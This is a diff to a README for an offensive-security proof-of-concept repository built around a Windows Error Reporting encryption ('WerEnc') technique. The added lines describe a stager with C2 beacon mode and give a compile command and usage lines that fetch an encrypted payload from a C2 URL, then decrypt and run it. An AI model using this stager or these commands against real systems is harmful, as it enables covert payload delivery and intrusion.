@@ -1,5 +1,5 @@
 
-the following repo contains several PoCs, created during the research, analysis and development. you might find duplication and unused code blocks but the idea is clear enough if you want to use WerEnc technique.
+the following repo contains several PoCs, created during the research, analysis and development. you might find duplication and unused code blocks but the idea is clear enough if you want to use WerEnc technique. 
 
 werenc_probe.c -> API signature probing. 
 
@@ -25,5 +25,17 @@ Usage:
  *   werenc_byok.exe --capture <input.file>    Encrypt + log BCrypt keys/IVs
  *   werenc_byok.exe --scan-dll               Scan WerEnc.dll for RSA blobs
 
+werenc_rt.c -> custom stager, PoC created for offensive security, it has web stager, beacon mode to fetch keys and cache into memory with threaded sleep encryption(nothing fancy). 
+
+Compilation: 
+x86_64-w64-mingw32-gcc -O2 -o werenc_rt.exe werenc_rt.c -municode 
+
+Usage: 
+ *   werenc_rt.exe --url http://c2/sc.byok.enc              fetch+decrypt+exec
+ *   werenc_rt.exe --test <file.byok.enc>                   decrypt+hexdump
+ *   werenc_rt.exe --mem-stage <raw.bin>                    encrypt+decrypt+exec
+ *   werenc_rt.exe --beacon <payload> --c2 http://c2/keys   sleep-cycle with C2 keys
+ *   werenc_rt.exe --beacon <payload> --sleep 5000           lab mode (keys from disk)
 
 
+follow me on X : https://x.com/zux0x3a 
